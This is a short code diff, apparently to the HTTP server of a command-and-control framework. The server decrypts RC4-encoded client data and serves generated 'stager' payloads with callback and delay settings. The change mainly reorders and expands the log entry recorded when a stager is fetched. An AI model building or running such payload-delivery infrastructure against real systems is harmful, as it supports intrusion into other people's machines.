@@ -82,7 +82,6 @@ def HTTPDFactory(config):
                 data = json.loads(data)
                 data["Data"] = self.rc4.dcrypt(base64.b64decode(data["Data"]))
             except Exception as e:
-                print("%s, %s" % (sys.exc_info()[1],sys.exc_info()[2]))
                 Log.log_error("Invalid base64 data received or bad decryption", self.path)
                 self.return_data()
                 return
@@ -131,9 +130,7 @@ def HTTPDFactory(config):
             payload_path = self.path.split("/")
             filename = Utils.gen_str(12)
             if payload_path[1] == self.config.get("http-download-path"):
-                filename = "%s.%s" % (Utils.gen_str(12), payload_path[2])
                 force_download = True
-                Log.log_event("Download Stager", "Stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
                 payload = Payload(self.config)
                 payload.set_callback("__default__")
 
@@ -143,6 +140,9 @@ def HTTPDFactory(config):
                 if len(payload_path) > 4:
                     payload.set_delay(payload_path[3])
                     payload.set_callback(payload_path[4])
+
+                filename = "%s.%s" % (Utils.gen_str(12), payload_path[2])
+                Log.log_event("Download Stager", "Stager was fetched from %s (%s). Stager type is %s" % (self.client_address[0], self.address_string(), payload_path[2]))
 
                 self.output = payload.get_output()
             elif path in Utils.get_download_folder_content():
